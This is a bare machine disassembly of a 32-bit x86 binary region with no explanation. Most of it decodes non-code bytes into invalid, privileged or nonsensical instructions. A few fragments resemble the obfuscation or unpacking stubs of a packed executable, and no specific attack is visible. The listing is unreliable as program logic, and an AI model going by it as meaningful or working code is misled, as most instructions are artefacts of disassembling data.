  40f9ba:	scas   al,BYTE PTR es:[edi]
  40f9bb:	or     cl,ch
  40f9bd:	int    0xda
  40f9bf:	popf   
  40f9c0:	pop    edx
  40f9c1:	pop    edi
  40f9c2:	loopne 0x40fa04
  40f9c4:	push   edi
  40f9c5:	pop    edi
  40f9c6:	add    edi,DWORD PTR [edi+0x7d]
  40f9c9:	xlat   BYTE PTR ds:[ebx]
  40f9ca:	sbb    ecx,ebx
  40f9cc:	adc    ax,0x7569
  40f9d0:	repz adc DWORD PTR ss:[edx],ebx
  40f9d4:	push   esi
  40f9d5:	adc    esi,DWORD PTR ds:0x433677
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43367b
  40f9e5:	adc    DWORD PTR ds:0x433733,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	hlt    
  40fa11:	mov    ebx,0xb50b5c8a
  40fa16:	jle    0x40fa96
  40fa18:	lods   al,BYTE PTR ds:[esi]
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40fa20
  40fa1d:	jmp    0x679d:0x62307261
  40fa24:	push   esp
  40fa25:	xor    ebp,DWORD PTR [eax+0x6b]
  40fa28:	mov    DWORD PTR [ecx+0x2de41f0f],ecx
  40fa2e:	pushf  
  40fa2f:	inc    ebx
  40fa30:	mov    ebx,0xd562de9d
  40fa35:	pushw  0x6a
  40fa38:	xchg   ebp,eax
  40fa39:	imul   DWORD PTR [esi+0x403278c4]
  40fa3f:	hlt    
  40fa40:	mov    edi,0x8f855347
  40fa45:	sti    
  40fa46:	jmp    0x40f9da
  40fa48:	mov    dh,0x2b
  40fa4a:	jnp    0x40fa9b
  40fa4c:	push   ebx
  40fa4d:	inc    eax
  40fa4e:	cdq    
  40fa4f:	(bad)  
  40fa50:	into   
  40fa51:	cld    
  40fa52:	adc    ebx,ebx
  40fa54:	push   ss
  40fa55:	mov    edx,0xf260055c
  40fa5a:	jo     0x40fa3f
  40fa5c:	arpl   ax,bx
  40fa5e:	add    ebx,DWORD PTR [edx+0x7d]
  40fa61:	pop    edx
  40fa62:	mov    ?,WORD PTR [esi]
  40fa64:	retf   
  40fa65:	ffreep st(3)
  40fa67:	test   dh,ah
  40fa69:	push   ebp
  40fa6a:	leave  
  40fa6b:	fnstcw WORD PTR [edx+edx*4-0x3d]
  40fa6f:	les    edi,FWORD PTR [ecx]
  40fa71:	xor    eax,0x28f7b0fa
  40fa76:	ss inc edx
  40fa78:	pop    es
  40fa79:	pop    ds
  40fa7a:	pushf  
  40fa7b:	sub    DWORD PTR [edx+0x7f],esp
  40fa7e:	fmul   st,st(1)
  40fa80:	add    ebp,ebx
  40fa82:	dec    esi
  40fa83:	add    BYTE PTR [edi],dl
  40fa85:	jbe    0x40fa3b
  40fa87:	jns    0x40fa80
  40fa89:	and    BYTE PTR [ebx+0x2],0x65
  40fa8d:	and    ebx,DWORD PTR [eax+esi*1-0x20068da4]
  40fa94:	add    eax,0xed4bb5da
  40fa99:	inc    ecx
  40fa9a:	jmp    0x40fafe
  40fa9c:	xchg   ebx,eax
  40fa9d:	cdq    
  40fa9e:	addr16 retf 
  40faa0:	aas    
  40faa1:	shl    BYTE PTR [esi-0x4688d18d],0xaf
  40faa8:	test   DWORD PTR [esi-0x69],0xe85929b8
  40faaf:	popf   
  40fab0:	add    BYTE PTR [ebp-0x642cd6e8],dl
  40fab6:	psubusb mm3,mm1
  40fab9:	jno    0x40fb24
  40fabb:	dec    ebx
  40fabc:	call   0x9fb:0x429d475d
  40fac3:	stos   DWORD PTR es:[edi],eax
  40fac4:	cmp    al,0xb2
  40fac6:	mov    bl,0xcb
  40fac8:	inc    ebx
  40fac9:	inc    esp
  40faca:	add    BYTE PTR [edx-0x21c5308b],bh
  40fad0:	push   esp
  40fad1:	lahf   
  40fad2:	add    BYTE PTR [ecx-0x2e6415d5],dh
  40fad8:	sbb    DWORD PTR [ebx],ebx
  40fada:	call   FWORD PTR ds:0xcc25f1c6
  40fae0:	fisubr WORD PTR [ecx]
  40fae2:	leave  
  40fae3:	dec    ecx
  40fae4:	cld    
  40fae5:	pusha  
  40fae6:	ins    DWORD PTR es:[edi],dx
  40fae7:	xchg   ebx,eax
  40fae8:	cmp    ebp,DWORD PTR [edi-0x23fcf49b]
  40faee:	sub    ecx,ecx
  40faf0:	cdq    
  40faf1:	pop    edx
  40faf2:	mov    al,ds:0xb1150bd6
  40faf7:	jl     0x40fafa
  40faf9:	mov    ebp,0x4e7e2a42
  40fafe:	daa    
  40faff:	push   ecx
  40fb00:	das    
  40fb01:	mov    esp,0xb407739b
  40fb06:	lods   al,BYTE PTR ds:[esi]
  40fb07:	(bad)  [edi-0x7]
  40fb0a:	in     eax,dx
  40fb0b:	pop    ss
  40fb0c:	test   eax,0xabd350c6
  40fb11:	ins    DWORD PTR es:[edi],dx
  40fb12:	mov    cl,0xc3
  40fb14:	pop    ebx
  40fb15:	or     al,0x9b
  40fb17:	retf   0xc38a
  40fb1a:	pop    es
  40fb1b:	and    BYTE PTR [esi],al
  40fb1d:	adc    eax,0x8ff41676
  40fb22:	jl     0x40faca
  40fb24:	pop    ebp
  40fb25:	and    edi,DWORD PTR [eax-0x50e2f4a7]
  40fb2b:	mov    dh,cl
  40fb2d:	push   esi
  40fb2e:	fnstcw WORD PTR [eax]
  40fb30:	sub    BYTE PTR fs:[esi+0x7e8e5282],dl
  40fb37:	mov    cl,0xd6
  40fb39:	neg    BYTE PTR [esi]
  40fb3b:	or     DWORD PTR [ecx],edi
  40fb3d:	(bad)  
  40fb3f:	mov    eax,ds:0x9bc4a118
  40fb44:	push   edx
  40fb45:	or     ecx,0x1547e27e
  40fb4b:	push   edi
  40fb4c:	and    cl,ch
  40fb4e:	stc    
  40fb4f:	sub    DWORD PTR [eax+0x3f],ebx
  40fb52:	add    ebx,DWORD PTR [esi+eax*8+0x6239076c]
  40fb59:	dec    edi
  40fb5a:	popf   
  40fb5b:	fucomip st,st(6)
  40fb5d:	sbb    ebp,ebp
  40fb5f:	cld    
  40fb60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb61:	jge    0x40fbc0
  40fb63:	mov    esp,0x56a7e49b
  40fb68:	adc    cl,BYTE PTR [edi+0x73]
  40fb6b:	xor    bh,bl
  40fb6d:	jp     0x40fb8e
  40fb6f:	push   ebx
  40fb70:	mov    al,ds:0x73e502fb
  40fb75:	in     al,dx
  40fb76:	ins    BYTE PTR es:[edi],dx
  40fb77:	pusha  
  40fb78:	repz cdq 
  40fb7a:	push   ss
  40fb7b:	fisub  DWORD PTR [ecx+ecx*8-0x71d3bdb9]
  40fb82:	cs (bad) 
  40fb84:	or     eax,0x382f478c
  40fb89:	sub    al,0x5e
  40fb8b:	mov    WORD PTR [ebx+0x18],cs
  40fb8e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb90:	push   ebp
  40fb91:	xchg   edx,eax
  40fb92:	fimul  DWORD PTR [ebx]
  40fb94:	add    esi,DWORD PTR [esp+ecx*1]
  40fb97:	pusha  
  40fb98:	mov    esp,0x1d6c0f16
  40fb9d:	mov    gs,WORD PTR [ebx+0x55]
  40fba0:	(bad)  
  40fba1:	pushf  
  40fba2:	repnz push eax
  40fba4:	shl    BYTE PTR [edx+eiz*8-0x2d],1
  40fba8:	mov    al,ds:0xc40c630a
  40fbad:	mov    ds:0x65ea8cc4,eax
  40fbb2:	cli    
  40fbb3:	dec    ebx
  40fbb4:	mov    eax,ds:0xe9fd906f
  40fbb9:	sbb    dh,bl
  40fbbb:	loopne 0x40fbe9
  40fbbd:	shl    DWORD PTR [edi-0x5b],1
  40fbc0:	ds sub eax,0x8e18c084
  40fbc6:	inc    esi
  40fbc7:	mov    edx,0x1ea3d507
  40fbcc:	mov    dh,0x75
  40fbce:	shl    DWORD PTR [edx+0x5e],0x2d
  40fbd2:	mov    ch,0xf8
  40fbd4:	sar    BYTE PTR [ecx+0x253e63cf],1
  40fbda:	jmp    0x2a6161ea
  40fbdf:	xor    al,BYTE PTR [ebp+0x26de3b20]
  40fbe5:	scas   eax,DWORD PTR es:[edi]
  40fbe6:	mov    BYTE PTR [ecx+0x1e],dh
  40fbe9:	mov    eax,0x444673f8
  40fbee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbef:	xor    al,bh
  40fbf1:	shl    DWORD PTR [ebx+ecx*4+0x33],0x9
  40fbf6:	and    DWORD PTR [esi+0x70dcd9b1],eax
  40fbfc:	mov    ?,eax
  40fbfe:	push   esp
  40fbff:	loopne 0x40fbb7
  40fc01:	aad    0x37
  40fc03:	mov    ah,0xb0
  40fc05:	adc    al,cl
  40fc07:	fnstcw WORD PTR [esi]
  40fc09:	je     0x40fc43
  40fc0b:	cwde   
  40fc0c:	retf   0xe14c
  40fc0f:	fld    TBYTE PTR [edx+0x42b2ec11]
  40fc15:	fwait
  40fc16:	push   ss
  40fc17:	or     eax,0x79227350
  40fc1c:	jmp    0x40fbba
  40fc1e:	add    esp,eax
  40fc20:	xchg   esp,eax
  40fc21:	dec    esi
  40fc22:	or     cl,BYTE PTR [ebx-0xc]
  40fc25:	sub    al,0x5a
  40fc27:	mov    al,0xe2
  40fc29:	(bad)  
  40fc2a:	imul   ebp,DWORD PTR ds:0x8a8dff24,0x74
  40fc31:	jo     0x40fc1f
  40fc33:	pusha  
  40fc34:	mov    ch,0x20
  40fc36:	rol    dl,cl
  40fc38:	hlt    
  40fc39:	push   eax
  40fc3a:	out    0xa2,al
  40fc3c:	fmul   st(4),st
  40fc3e:	add    edx,DWORD PTR [esi+0x56da9ab3]
  40fc44:	lahf   
  40fc45:	mov    dl,0xa4
  40fc47:	jmp    0x40fc71
  40fc49:	(bad)  [edi+0x253145a6]
  40fc4f:	jne    0x40fbf0
  40fc51:	or     edi,eax
  40fc53:	retf   
  40fc54:	cli    
  40fc55:	jo     0x40fbfd
  40fc57:	push   esi
  40fc58:	push   cs
  40fc59:	stc    
  40fc5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc5b:	adc    eax,eax
  40fc5d:	in     al,dx
  40fc5e:	cmp    eax,0x9a4fb75b
  40fc63:	mov    ecx,0x89d24921
  40fc68:	push   ds
  40fc69:	fcomp  QWORD PTR [esi]
  40fc6b:	aad    0xdc
  40fc6d:	fs addr16 ret 0xdd29
  40fc72:	test   eax,0xf61835b4
  40fc77:	inc    edx
  40fc78:	mov    edi,eax
  40fc7a:	fbstp  TBYTE PTR [ecx+eiz*8]
  40fc7d:	mov    ds:0x8fcbb5cd,al
  40fc82:	out    0x1c,al
  40fc84:	retf   0x2f63
  40fc87:	push   ecx
  40fc88:	mov    cl,0xdf
  40fc8a:	fs mov cl,0x3b
  40fc8d:	push   edi
  40fc8e:	in     eax,dx
  40fc8f:	mov    al,0xc4
  40fc91:	retf   
  40fc92:	dec    ecx
  40fc93:	xchg   BYTE PTR [ebx+ebx*8+0x7700e111],dl
  40fc9a:	cmp    ah,ch
  40fc9c:	xor    al,0xdc
  40fc9e:	add    al,0xd0
  40fca0:	call   0x4b3809e8
  40fca5:	daa    
  40fca6:	mov    edx,ebx
  40fca8:	jo     0x40fd19
  40fcaa:	sahf   
  40fcab:	xchg   DWORD PTR [ebp-0x4ccc33f],ebp
  40fcb1:	push   edi
  40fcb2:	xor    edi,eax
  40fcb4:	jne    0x40fc73
  40fcb6:	mov    cl,0x3a
  40fcb8:	retf   
  40fcb9:	fwait
  40fcba:	out    dx,al
  40fcbb:	cdq    
  40fcbc:	or     dl,ch
  40fcbe:	sub    ah,al
  40fcc0:	inc    edi
  40fcc1:	pop    eax
  40fcc2:	les    edx,FWORD PTR [ebx-0x4083d471]
  40fcc8:	and    BYTE PTR [ebx],al
  40fcca:	push   esp
  40fccb:	mov    ds:0xf1033eb6,eax
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	rcl    DWORD PTR [eax],0x19
  40fce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fce6:	pop    eax
  40fce7:	mov    ecx,0xac7e7eb3
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fd37
  40fcf0:	(bad)  
  40fcf2:	ret    0xccc3
  40fcf5:	nop
  40fcf6:	icebp  
  40fcf7:	push   ebp
  40fcf8:	loopne 0x40fd05
  40fcfa:	(bad)
  40fcfd:	ins    BYTE PTR es:[edi],dx
  40fcfe:	loope  0x40fc82
  40fd00:	and    ebx,DWORD PTR [edx]
  40fd02:	adc    DWORD PTR [edi],esi
  40fd04:	adc    BYTE PTR [ebx],dh
  40fd06:	repz cmp bh,BYTE PTR [ebp+0x3c]
  40fd0a:	or     edx,DWORD PTR [ecx]
  40fd0c:	test   DWORD PTR [ebx+0x2d],edx
  40fd0f:	cmp    DWORD PTR [ebx-0x57],0x60c23241
  40fd16:	or     edi,esi
  40fd18:	cmp    BYTE PTR [ebp+ebp*4-0x66],al
  40fd1c:	lods   al,BYTE PTR ds:[esi]
  40fd1d:	or     al,BYTE PTR [ecx]
  40fd1f:	sub    eax,0x689f7986
  40fd24:	into   
  40fd25:	cmp    BYTE PTR [eax-0x20b1c174],al
  40fd2b:	std    
  40fd2c:	add    eax,0x33388c28
  40fd31:	loope  0x40fcff
  40fd33:	inc    edi
  40fd34:	sub    esp,esi
  40fd36:	xlat   BYTE PTR ds:[ebx]
  40fd37:	fisub  DWORD PTR [eax+edi*8+0x3e]
  40fd3b:	or     DWORD PTR gs:[esi+0x2b],0x79
  40fd40:	stc    
  40fd41:	data16 fsub DWORD PTR [edi-0x4f]
  40fd45:	jl     0x40fd1a
  40fd47:	adc    edi,edi
  40fd49:	mov    dh,0x7d
  40fd4b:	imul   edi,DWORD PTR [edi-0x21f2a5d0],0x13b4346b
  40fd55:	js     0x40fd5e
  40fd57:	push   cs
  40fd58:	lods   al,BYTE PTR ds:[esi]
  40fd59:	das    
  40fd5a:	cdq    
  40fd5b:	ins    BYTE PTR es:[edi],dx
  40fd5c:	fdiv   QWORD PTR [edi-0x4e]
  40fd5f:	(bad)  
  40fd60:	dec    esi
  40fd61:	push   cs
  40fd62:	adc    al,0xc7
  40fd64:	pushf  
  40fd65:	jl     0x40fd2d
  40fd67:	jp     0x40fcff
  40fd69:	push   eax
  40fd6a:	and    al,0xb0
  40fd6c:	push   ss
  40fd6d:	push   0xffffffc6
  40fd6f:	and    eax,0xeb571066
  40fd74:	in     eax,dx
  40fd75:	adc    esi,esi
  40fd77:	fadd   st(3),st
  40fd79:	sub    al,0x75
  40fd7b:	mov    esp,0x5c647469
  40fd80:	pop    ebx
  40fd81:	xchg   ebp,eax
  40fd82:	out    dx,al
  40fd83:	lods   eax,DWORD PTR ds:[esi]
  40fd84:	(bad)  
  40fd85:	lahf   
  40fd86:	xchg   eax,esp
  40fd88:	or     DWORD PTR [ecx],esp
  40fd8a:	in     al,dx
  40fd8b:	les    ecx,FWORD PTR [esi]
  40fd8d:	icebp  
  40fd8e:	pushf  
  40fd8f:	and    ecx,0xffffff8d
  40fd92:	push   eax
  40fd93:	shl    DWORD PTR [ebp+0x42674d23],0xa8
  40fd9a:	rcr    BYTE PTR [edx-0x7b],1
  40fd9d:	sbb    BYTE PTR [edi-0x3806a858],ch
  40fda3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fda4:	lods   eax,DWORD PTR ds:[esi]
  40fda5:	nop
  40fda6:	pop    eax
  40fda7:	mov    edi,0x837a38a9
  40fdac:	jecxz  0x40fde7
  40fdae:	and    al,0xc2
  40fdb0:	dec    ebp
  40fdb1:	xchg   esi,eax
  40fdb2:	fdiv   st,st(1)
  40fdb4:	ret    0x275c
  40fdb7:	lds    ebp,FWORD PTR [ecx+0x6d61774a]
  40fdbd:	(bad)
  40fdc1:	and    eax,0xd7952c8b
  40fdc6:	mov    al,0xcc
  40fdc8:	push   ss
  40fdc9:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40fdcb:	mov    ch,BYTE PTR [esi+0x741a9e8]
  40fdd1:	jmp    0x52bc:0x89345a7
  40fdd8:	test   BYTE PTR [edx+ecx*1-0x3c0f03ce],bl
  40fddf:	pop    ebp
  40fde0:	mov    ds:0x22adc9fb,al
  40fde5:	cmp    dh,BYTE PTR [edi]
  40fde7:	and    esp,DWORD PTR [ecx-0x51]
  40fdea:	pop    es
  40fdeb:	jge    0x40fd8e
  40fded:	inc    ebp
  40fdee:	xor    eax,0x4e40f74b
  40fdf3:	pop    ecx
  40fdf4:	jae    0x40fe1e
  40fdf6:	fisttp DWORD PTR [eax+ebx*1+0x7d]
  40fdfa:	pusha  
  40fdfb:	pusha  
  40fdfc:	dec    esp
  40fdfd:	ss push es
  40fdff:	adc    dl,BYTE PTR [esi+0x49]
  40fe02:	hlt    
  40fe03:	imul   ebx,DWORD PTR [ecx-0x1ea20764],0x651753f5
  40fe0d:	push   0x3bf28440
  40fe12:	or     eax,DWORD PTR [ecx-0x5]
  40fe15:	xor    cl,BYTE PTR ds:0x97226e17
  40fe1b:	mov    esp,DWORD PTR [edx+ecx*1]
  40fe1e:	or     BYTE PTR [esi-0x60444e78],al
  40fe24:	js     0x40fe63
  40fe26:	sbb    BYTE PTR [edx+ebp*2-0x4a],0x8c
  40fe2b:	xlat   BYTE PTR ds:[ebx]
  40fe2c:	mov    ds:0xb586f1ea,al
  40fe31:	mov    ds:0xf2b335ab,eax
  40fe36:	clc    
  40fe37:	mov    esp,0x532e1aac
  40fe3c:	in     al,0xae
  40fe3e:	dec    esi
  40fe3f:	iret   
  40fe40:	jecxz  0x40fe2c
  40fe42:	sub    ah,BYTE PTR [esi]
  40fe44:	xor    esp,0x7c
  40fe47:	inc    eax
  40fe48:	test   BYTE PTR [eax+0x25],bl
  40fe4b:	clc    
  40fe4c:	outs   dx,DWORD PTR ds:[esi]
  40fe4d:	popa   
  40fe4e:	lahf   
  40fe4f:	cmp    BYTE PTR [edi],bl
  40fe51:	stos   BYTE PTR es:[edi],al
  40fe52:	lea    eax,[esi+0x4b]
  40fe55:	adc    eax,0x620ee9f9
  40fe5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe5b:	push   0xde771ed6
  40fe60:	add    eax,0x2893768f
  40fe65:	pop    ebx
  40fe66:	loopne 0x40feb1
  40fe68:	test   eax,0xdc773fd2
  40fe6d:	loop   0x40fe35
  40fe6f:	sub    ebx,DWORD PTR [ecx+0x26927273]
  40fe75:	adc    esi,ebp
  40fe77:	je     0x40fe97
  40fe79:	add    eax,0xd532e718
  40fe7e:	mov    WORD PTR [ebx],ss
  40fe80:	in     eax,dx
  40fe81:	(bad)  
  40fe82:	add    DWORD PTR [ecx],edi
  40fe84:	push   cs
  40fe85:	and    dl,bl
  40fe87:	bound  esp,QWORD PTR ds:0x8f4e798c
  40fe8d:	dec    esp
  40fe8e:	xor    eax,0xb26d1d80
  40fe93:	leave  
  40fe94:	sbb    BYTE PTR [eax+0x4a],ch
  40fe97:	adc    DWORD PTR [esi+0x69],ebx
  40fe9a:	shr    ah,1
  40fe9c:	test   BYTE PTR ss:[edi-0x2f],al
  40fea0:	enter  0x6d11,0xa7
  40fea4:	fist   WORD PTR [ebx-0x39]
  40fea7:	cmc    
  40fea8:	jae    0x40fe4c
  40feaa:	pop    ebp
  40feab:	jo     0x40fe86
  40fead:	fs xor al,0x61
  40feb0:	aas    
  40feb1:	xchg   edi,eax
  40feb2:	stc    
  40feb3:	popf   
  40feb4:	daa    
  40feb5:	iret   
  40feb6:	(bad)  
  40feb7:	mov    BYTE PTR [ecx+ebx*2+0x2fd58373],cl
  40febe:	daa    
  40febf:	shl    BYTE PTR [edi-0x11a6ac38],1
  40fec5:	push   0x32
  40fec7:	sub    DWORD PTR [edx-0x30],eax
  40feca:	inc    eax
  40fecb:	stc    
  40fecc:	mov    dl,0x7c
  40fece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fecf:	add    al,0x4e
  40fed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fed2:	fwait
  40fed3:	cwde   
  40fed4:	ins    DWORD PTR es:[edi],dx
  40fed5:	cwde   
  40fed6:	jmp    0x577444ae
  40fedb:	mov    ah,0xb6
  40fedd:	dec    edi
  40fede:	inc    edx
  40fedf:	or     al,0x5b
  40fee1:	daa    
  40fee2:	hlt    
  40fee3:	clc    
  40fee4:	pushf  
  40fee5:	jp     0x40fe7f
  40fee7:	pop    ebx
  40fee8:	mov    dh,0xff
  40feea:	retf   
  40feeb:	loopne 0x40ff40
  40feed:	fdivr  QWORD PTR [esi]
  40feef:	out    dx,eax
  40fef0:	gs and BYTE PTR ss:[edx],ah
  40fef4:	dec    esi
  40fef5:	je     0x40ff6b
  40fef7:	cli    
  40fef8:	loope  0x40ff51
  40fefa:	outs   dx,BYTE PTR ds:[esi]
  40fefb:	cmc    
  40fefc:	xchg   ebp,eax
  40fefd:	clc    
  40fefe:	aas    
  40feff:	mov    al,ds:0x20debc79
  40ff04:	fs jecxz 0x40fede
  40ff07:	jo     0x40ff2e
  40ff09:	dec    ecx
  40ff0a:	lahf   
  40ff0b:	xor    DWORD PTR [ecx+0x268f1955],eax
  40ff11:	out    0x7c,eax
  40ff13:	sub    BYTE PTR [esi+0x44832f82],0xe3
  40ff1a:	lahf   
  40ff1b:	icebp  
  40ff1c:	push   esi
  40ff1d:	sahf   
  40ff1e:	mov    eax,0x22762a45
  40ff23:	dec    ebp
  40ff24:	and    BYTE PTR [edi+0x1],0xe7
  40ff28:	popf   
  40ff29:	sub    eax,0xc79fcec7
  40ff2e:	fcom   DWORD PTR [esi-0x48]
  40ff31:	xchg   DWORD PTR [esi+esi*2],ebp
  40ff34:	mov    ecx,0x735c5508
  40ff39:	push   ecx
  40ff3a:	push   edi
  40ff3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff3c:	cmp    eax,0xd8c91870
  40ff41:	les    ecx,FWORD PTR [edi-0x8]
  40ff44:	enter  0x809,0xdb
  40ff48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff49:	cdq    
  40ff4a:	(bad)  
  40ff4b:	std    
  40ff4c:	outs   dx,DWORD PTR ds:[esi]
  40ff4d:	cmp    DWORD PTR [esi-0x1d],ebx
  40ff50:	xor    esp,DWORD PTR ds:0x1d2bb36d
  40ff56:	adc    al,0x4e
  40ff58:	inc    esi
  40ff59:	stos   DWORD PTR es:[edi],eax
  40ff5a:	hlt    
  40ff5b:	sbb    ch,BYTE PTR [ebx-0x22]
  40ff5e:	jno    0x40ff62
  40ff60:	xchg   ebp,eax
  40ff61:	cmp    al,0x72
  40ff63:	add    bh,0x83
  40ff66:	mov    bl,0xcf
  40ff68:	add    dh,BYTE PTR [edx-0x1c]
  40ff6b:	fidiv  WORD PTR [ebx]
  40ff6d:	shl    BYTE PTR [ebx],0x5
  40ff70:	out    dx,eax
  40ff71:	loop   0x40ff49
  40ff73:	vcvtsi2sd xmm5,xmm7,DWORD PTR [eax+0x6142efd3]
  40ff7b:	mov    dh,BYTE PTR [ebx+0x6e9a1c2a]
  40ff81:	xchg   esi,eax
  40ff82:	mov    esp,0xd1e261cb
  40ff87:	sbb    BYTE PTR [ecx-0x6e6b46e3],0x2b
  40ff8e:	loopne 0x40ff72
  40ff90:	fldenv [edx]
  40ff92:	push   edi
  40ff93:	sbb    esi,DWORD PTR [ecx+0x5a1a168d]
  40ff99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff9a:	lea    edi,[ebx-0x63aaa7c2]
  40ffa0:	jge    0x40ffb1
  40ffa2:	scas   eax,DWORD PTR es:[edi]
  40ffa3:	(bad)  
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433623,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4336e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0xe06139b1
  40ffd9:	jnp    0x410013
  40ffdb:	idiv   DWORD PTR [esi+0x7cac7e7e]
  40ffe1:	jle    0x410061
  40ffe3:	fcmovne st,st(0)
  40ffe5:	sub    eax,0xe6b7e56e
  40ffea:	gs nop
  40ffec:	mov    dl,0x8e
  40ffee:	inc    eax
  40ffef:	mov    ds:0x8621ba9b,eax
  40fff4:	add    edx,DWORD PTR [esi]
  40fff6:	jmp    0x410066
  40fff8:	imul   eax,DWORD PTR [ebx+edi*8],0x8ebe3e2
  40ffff:	mov    al,BYTE PTR [edx-0x73]
  410002:	add    ebp,DWORD PTR [eax+eiz*4]
  410005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410006:	mov    bh,0xce
  410008:	dec    esi
  410009:	xchg   DWORD PTR [edx+0x46],ebx
  41000c:	pop    ebx
  41000d:	push   ecx
  41000e:	leave  
  41000f:	sub    bh,BYTE PTR [edi+0x33e239ec]
  410015:	mov    cl,0xdc
  410017:	ror    BYTE PTR [edi],1
  410019:	xchg   esp,eax
  41001a:	push   cs
  41001b:	mov    al,ds:0xb755f972
  410020:	cmp    al,ch
  410022:	mov    bh,0x6f
  410024:	in     eax,0x42
  410026:	(bad)  
  410027:	push   0x2fd3718f
  41002c:	mov    bl,bh
  41002e:	test   bh,dl
  410030:	mov    eax,ds:0x46b99296
  410035:	mov    BYTE PTR [ecx+0x1a],ch
  410038:	pop    es
  410039:	(bad)  
  41003a:	pushf  
  41003b:	add    DWORD PTR [edi+ecx*8-0x16a83571],ecx
  410042:	jle    0x41009b
  410044:	(bad)  
  410045:	dec    ecx
  410046:	jecxz  0x41001b
  410048:	fisttp QWORD PTR [edi]
  41004a:	daa    
  41004b:	push   eax
  41004c:	jns    0x41007b
  41004e:	mov    esi,DWORD PTR [ecx-0x6bf99891]
  410054:	int    0x7a
  410056:	pop    esi
  410057:	scas   eax,DWORD PTR es:[edi]
  410058:	jmp    0xd829:0x3d531745
  41005f:	nop
  410060:	fidivr WORD PTR ds:0xbc8cab20
  410066:	push   esi
  410067:	les    ebp,FWORD PTR [esi]
  410069:	or     eax,0x74f500ac
  41006e:	fiadd  WORD PTR [ecx+0x7d]
  410071:	and    al,BYTE PTR [ebp+eax*1+0x7c]
  410075:	mov    ds:0x9c6c9a46,al
  41007a:	inc    ecx
  41007b:	push   eax
  41007c:	xor    al,0xe1
  41007e:	cld    
  41007f:	mov    BYTE PTR [edi],dh
  410081:	sahf   
  410082:	or     al,0x7c
  410084:	and    ch,BYTE PTR [eax-0x74]
  410087:	outs   dx,DWORD PTR ds:[esi]
  410088:	xchg   ecx,eax
  410089:	mov    ebp,0xff218aad
  41008e:	ins    BYTE PTR es:[edi],dx
  41008f:	push   cs
  410090:	add    DWORD PTR [edi-0x11],0x54f85ade
  410097:	(bad)  
  410098:	fsub   QWORD PTR [ebx+eiz*1+0x41361765]
  41009f:	mov    edx,0x5bcdd58f
  4100a4:	(bad)
  4100a7:	lods   eax,DWORD PTR ds:[esi]
  4100a8:	add    eax,0x265680f0
  4100ad:	aaa    
  4100ae:	sub    edi,DWORD PTR [ecx+ebx*4]
  4100b1:	cdq    
  4100b2:	lahf   
  4100b3:	ss (bad) 
  4100b5:	xlat   BYTE PTR ds:[ebx]
  4100b6:	scas   eax,DWORD PTR es:[edi]
  4100b7:	sahf   
  4100b8:	ret    
  4100b9:	dec    edx
  4100ba:	inc    BYTE PTR [ebx+0x44f3f85f]
  4100c0:	and    DWORD PTR [ebx],ebx
  4100c2:	pop    eax
  4100c3:	jmp    0x6b80:0xdbacc9ea
  4100ca:	xchg   BYTE PTR [esi-0x28],al
  4100cd:	int3   
  4100ce:	test   DWORD PTR [edi+0x71],edx
  4100d1:	loop   0x410100
  4100d3:	data16 loop 0x410069
  4100d6:	stos   BYTE PTR es:[edi],al
  4100d7:	test   eax,ebx
  4100d9:	aaa    
  4100da:	inc    esi
  4100db:	into   
  4100dc:	push   0xffffffc4
  4100de:	aam    0xf5
  4100e0:	ds inc ebx
  4100e2:	push   es
  4100e3:	pop    edi
  4100e4:	aaa    
  4100e5:	outs   dx,DWORD PTR ds:[esi]
  4100e6:	mov    al,ds:0xef7a0080
  4100eb:	jne    0x4100c6
  4100ed:	test   al,0x5b
  4100ef:	aaa    
  4100f0:	or     esp,ebx
  4100f2:	ins    DWORD PTR es:[edi],dx
  4100f3:	mov    DWORD PTR [edx-0x65],esp
  4100f6:	and    al,0x44
  4100f8:	pop    ebp
  4100f9:	mov    ds:0x9dcecf89,eax
  4100fe:	adc    edx,eax
  410100:	jnp    0x410111
  410102:	lock adc cl,BYTE PTR [edx-0x2f9be877]
  410109:	jns    0x4100ed
  41010b:	add    esi,esi
  41010d:	retf   0xd147
  410110:	dec    eax
  410111:	dec    edi
  410112:	in     al,dx
  410113:	fisttp WORD PTR [eax]
